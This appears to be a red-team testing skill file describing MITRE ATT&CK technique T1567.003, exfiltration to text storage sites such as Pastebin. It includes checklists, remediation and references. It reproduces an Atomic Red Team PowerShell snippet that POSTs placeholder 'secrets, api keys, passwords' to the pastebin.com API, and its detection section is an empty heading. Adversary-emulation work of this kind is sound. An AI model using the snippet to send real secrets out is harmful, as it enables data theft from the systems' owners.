---
name: "T1567.003_exfiltration-to-text-storage-sites"
description: "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel."
category: "client-side"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1567.003
  - exfiltration
  - linux
  - macos
  - windows
  - esxi
  - sub-technique
technique_id: "T1567.003"
tactic: "exfiltration"
all_tactics:
  - exfiltration
platforms:
  - Linux
  - macOS
  - Windows
  - ESXi
mitre_url: "https://attack.mitre.org/techniques/T1567/003"
tech_stack:
  - linux
  - macos
  - windows
  - esxi
cwe_ids:
  - CWE-200
chains_with:
  - T1567
  - T1567.001
  - T1567.002
  - T1567.004
prerequisites:
  - T1567
severity_boost:
  T1567: "Chain with T1567 for deeper attack path"
  T1567.001: "Chain with T1567.001 for deeper attack path"
  T1567.002: "Chain with T1567.002 for deeper attack path"
---

# T1567.003 Exfiltration to Text Storage Sites

> **Sub-technique of:** T1567

## High-Level Description

Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.

Text storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.

**Note:** This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.

## Kill Chain Phase

- Exfiltration (TA0010)

**Platforms:** Linux, macOS, Windows, ESXi

## What to Check

- [ ] Identify if Exfiltration to Text Storage Sites technique is applicable to target environment
- [ ] Check Linux systems for indicators of Exfiltration to Text Storage Sites
- [ ] Check macOS systems for indicators of Exfiltration to Text Storage Sites
- [ ] Check Windows systems for indicators of Exfiltration to Text Storage Sites
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)

This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)  
See https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it

**Supported Platforms:** windows

```powershell
$apiKey = "#{api_key}"
$content = "secrets, api keys, passwords..."
$url = "https://pastebin.com/api/api_post.php"
$postData = @{
  api_dev_key   = $apiKey
  api_option    = "paste"
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host "Your paste URL: $response"
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Exfiltration to Text Storage Sites by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1567.003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1021 Restrict Web-Based Content

Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.

## Detection

### Detection Strategy for Exfiltration to Text Storage Sites

## Risk Assessment

| Finding                                                 | Severity | Impact       |
| ------------------------------------------------------- | -------- | ------------ |
| Exfiltration to Text Storage Sites technique applicable | Low      | Exfiltration |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [Pastebin EchoSec](https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it)
- [Atomic Red Team - T1567.003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1567.003)
- [MITRE ATT&CK - T1567.003](https://attack.mitre.org/techniques/T1567/003)
